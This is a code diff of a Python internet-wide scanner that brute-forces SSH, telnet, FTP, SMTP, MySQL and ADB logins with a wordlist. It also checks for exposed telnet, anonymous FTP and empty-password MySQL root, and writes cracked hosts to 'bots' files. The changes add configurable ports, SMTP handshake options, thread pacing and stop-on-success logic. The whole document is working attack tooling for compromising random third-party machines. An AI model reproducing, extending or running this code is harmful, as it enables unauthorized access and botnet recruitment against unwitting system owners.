@@ -44,10 +44,16 @@ def getip():
   the following functions are used to scan safe IPs all over the internet with a wordlist, it can scan bruteforce their: ftp, ssh, telnet, smtp and mysql logins then save them on text files in the same directory.
   it's highly recommended to be used with a VPS or your slow internet speed will be an obstacle to your scan.
 '''
+__port=None
+__ehlo=True
+__helo=False
+__ttls=False
 class iots(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
   self.timeout=_timeout
+  self.port=__port
+  time.sleep(2)
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -57,7 +63,7 @@ class iots(threading.Thread):
    try:
     so=socket.socket()
     so.settimeout(self.timeout)
-    so.connect((ip,22))
+    so.connect((ip,self.port))
     i=True
     so.close()
    except Exception as ex: 
@@ -70,22 +76,25 @@ class iots(threading.Thread):
       username=x.split(':')[0]
       password=x.split(':')[1]
       if wido==True:
-       q=ssh_win(ip,username=username,password=password,timeout=self.timeout)
+       q=ssh_win(ip,username,password,timeout=self.timeout,p=self.port)
       elif termux==True:
-       q=ssh_andro(ip,username=username,password=password,timeout=self.timeout)
+       q=ssh_andro(ip,username,password,timeout=self.timeout,p=self.port)
       else:
-       q=ssh_linux(ip,username=username,password=password,timeout=self.timeout)
+       q=ssh_linux(ip,username,password,timeout=self.timeout,p=self.port)
       if q==True:
        ip+=':'+username+':'+password
        print (ip)
        write_file(ip,filen)
+       break
      except Exception as e: 
       pass
   self.ip_seg=None
   self.timeout=None
-def mass_ssh(threads=100,word_list=wordlist,filename='ssh_bots.txt',ip_range=None,timeout=5):
+def mass_ssh(threads=100,word_list=wordlist,filename='ssh_bots.txt',ip_range=None,timeout=5,p=22):
  global stop
  stop=False
+ global __port
+ __port=p
  global _timeout
  _timeout=timeout
  global ip_seg
@@ -100,6 +109,7 @@ def mass_ssh(threads=100,word_list=wordlist,filename='ssh_bots.txt',ip_range=Non
   try:
    t=iots().start()
    thr.append(t)
+   time.sleep(0.001)
   except:
    pass
  while (stop!=True):
@@ -118,6 +128,8 @@ class iott(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
   self.timeout=_timeout
+  self.port=__port
+  time.sleep(2)
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -127,13 +139,13 @@ class iott(threading.Thread):
    try:
     so=socket.socket()
     so.settimeout(self.timeout)
-    so.connect((ip,23))
+    so.connect((ip,self.port))
     i=True
     so.close()
    except Exception as ex: 
     pass
    if i==True:
-    if exposed_telnet(ip,timeout=self.timeout)==True:
+    if exposed_telnet(ip,timeout=self.timeout,p=self.port)==True:
         ip+='::'
         print (ip)
         write_file(ip,filen)
@@ -142,7 +154,7 @@ class iott(threading.Thread):
       try:
        username=x.split(':')[0]
        password=x.split(':')[1]
-       q= telnet(ip,username=username,password=password)
+       q= telnet(ip,username,password,timeout=self.timeout,p=self.port)
        if q==True:
         ip+=':'+username+':'+password
         print (ip)
@@ -152,9 +164,11 @@ class iott(threading.Thread):
        pass
   self.ip_seg=None
   self.timeout=None
-def mass_telnet(threads=500,word_list=wordlist,filename='telnet_bots.txt',ip_range=None,timeout=5):
+def mass_telnet(threads=500,word_list=wordlist,filename='telnet_bots.txt',ip_range=None,timeout=5,p=23):
  global stop
  stop=False
+ global __port
+ __port=p
  global _timeout
  _timeout=timeout
  global ip_seg
@@ -169,6 +183,7 @@ def mass_telnet(threads=500,word_list=wordlist,filename='telnet_bots.txt',ip_ran
   try:
    t=iott().start()
    thr.append(t)
+   time.sleep(0.001)
   except:
    pass
  while (stop!=True):
@@ -187,6 +202,8 @@ class iotelt(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
   self.timeout=_timeout
+  self.port=__port
+  time.sleep(2)
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -196,14 +213,14 @@ class iotelt(threading.Thread):
    try:
     so=socket.socket()
     so.settimeout(self.timeout)
-    so.connect((ip,23))
+    so.connect((ip,self.port))
     i=True
     so.close()
    except Exception as ex: 
     pass
    if i==True:
      try:
-      q= exposed_telnet(ip,timeout=self.timeout)
+      q= exposed_telnet(ip,timeout=self.timeout,p=self.port)
       if q==True:
        print (ip)
        write_file(ip,filen)
@@ -211,9 +228,11 @@ class iotelt(threading.Thread):
       pass
   self.ip_seg=None
   self.timeout=None
-def mass_exposed_telnet(threads=500,filename='exposed_telnet_bots.txt',ip_range=None,timeout=5):
+def mass_exposed_telnet(threads=500,filename='exposed_telnet_bots.txt',ip_range=None,timeout=5,p=23):
  global stop
  stop=False
+ global __port
+ __port=p
  global _timeout
  _timeout=timeout
  global ip_seg
@@ -228,6 +247,7 @@ def mass_exposed_telnet(threads=500,filename='exposed_telnet_bots.txt',ip_range=
   try:
    t=iotelt().start()
    thr.append(t)
+   time.sleep(0.001)
   except:
    pass
  while (stop!=True):
@@ -246,6 +266,7 @@ class iotf1(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
   self.timeout=_timeout
+  time.sleep(2)
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -265,10 +286,11 @@ class iotf1(threading.Thread):
      try:
       username=x.split(':')[0]
       password=x.split(':')[1]
-      if ftp(ip,username=username,password=password,timeout=self.timeout)==True:
+      if ftp(ip,username,password,timeout=self.timeout)==True:
        ip+=':'+username+':'+password
        print (ip)
        write_file(ip,filen)
+       break
      except Exception as e: 
       pass
   self.ip_seg=None
@@ -290,6 +312,7 @@ def mass_ftp(threads=100,meth=1,word_list=wordlist,filename='ftp_bots.txt',ip_ra
   try:
    t=iotf1().start()
    thr.append(t)
+   time.sleep(0.001)
   except:
    pass
  while (stop!=True):
@@ -308,6 +331,7 @@ class iotf2(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
   self.timeout=_timeout
+  time.sleep(2)
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -346,6 +370,7 @@ def mass_ftp_anon(threads=100,filename='ftp_anon_bots.txt',ip_range=None,timeout
   try:
    t=iotf2().start()
    thr.append(t)
+   time.sleep(0.001)
   except:
    pass
  while (stop!=True):
@@ -364,6 +389,11 @@ class iotsm(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
   self.timeout=_timeout
+  self.port=__port
+  self.ehlo=__ehlo
+  self.helo=__helo
+  self.ttls=__ttls
+  time.sleep(2)
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -382,7 +412,7 @@ class iotsm(threading.Thread):
      try:
       username=x.split(':')[0]
       password=x.split(':')[1]
-      if smtp(ip,username=username,password=password)==True:
+      if smtp(ip,username,password,p=self.port,ehlo=self.ehlo,helo=self.helo,ttls=self.ttls)==True:
        ip+=':'+username+':'+password
        print (ip)
        write_file(ip,filen)
@@ -390,9 +420,17 @@ class iotsm(threading.Thread):
       pass
   self.ip_seg=None
   self.timeout=None
-def mass_smtp(o,threads=100,word_list=wordlist,filename='smtp_bots.txt',ip_range=None,timeout=5):
+def mass_smtp(o,threads=100,word_list=wordlist,filename='smtp_bots.txt',ip_range=None,timeout=5,p=25,ehlo=True,helo=False,ttls=False):
  global ip_seg
  ip_seg=ip_range
+ global __ehlo
+ __ehlo=ehlo
+ global __helo
+ __helo=helo
+ global __ttls
+ __ttls=ttls
+ global __port
+ __port=p
  global _timeout
  _timeout=timeout
  global stop
@@ -409,6 +447,7 @@ def mass_smtp(o,threads=100,word_list=wordlist,filename='smtp_bots.txt',ip_range
   try:
    t=iotsm().start()
    thr.append(t)
+   time.sleep(0.001)
   except:
    pass
  while (stop!=True):
@@ -427,6 +466,7 @@ class iotmy(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
   self.timeout=_timeout
+  time.sleep(2)
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -446,10 +486,11 @@ class iotmy(threading.Thread):
      try:
       username=x.split(':')[0]
       password=x.split(':')[1]
-      if mysql(ip,username=username,password=password)==True:
+      if mysql(ip,username,password)==True:
        ip+=':'+username+':'+password
        print (ip)
        write_file(ip,filen)
+       break
      except Exception as e: 
       pass
   self.ip_seg=None
@@ -471,6 +512,7 @@ def mass_mysql(threads=100,word_list=wordlist,filename='mysql_bots.txt',ip_range
   try:
    t=iotmy().start()
    thr.append(t)
+   time.sleep(0.001)
   except:
    pass
  while (stop!=True):
@@ -487,9 +529,9 @@ def mass_mysql(threads=100,word_list=wordlist,filename='mysql_bots.txt',ip_range
     del x
 class iotmy2(threading.Thread):
  def run(self):
-  s=mysql
   self.ip_seg=ip_seg
   self.timeout=_timeout
+  time.sleep(2)
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -506,7 +548,7 @@ class iotmy2(threading.Thread):
     pass
    if i==True:
      try:
-      if mysql(ip)==True:
+      if mysql(ip,'root','')==True:
        ip+=':root:'
        print (ip)
        write_file(ip,filen)
@@ -531,6 +573,7 @@ def mass_mysql_default(threads=100,word_list=wordlist,filename='mysql_default_bo
   try:
    t=iotmy2().start()
    thr.append(t)
+   time.sleep(0.001)
   except:
    pass
  while (stop!=True):
@@ -549,6 +592,7 @@ class iotadb(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
   self.timeout=_timeout
+  time.sleep(2)
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -590,6 +634,7 @@ def mass_adb(threads=100,word_list=wordlist,filename='adb_bots.txt',ip_range=Non
   try:
    t=iotadb().start()
    thr.append(t)
+   time.sleep(0.001)
   except:
    pass
  while (stop!=True):
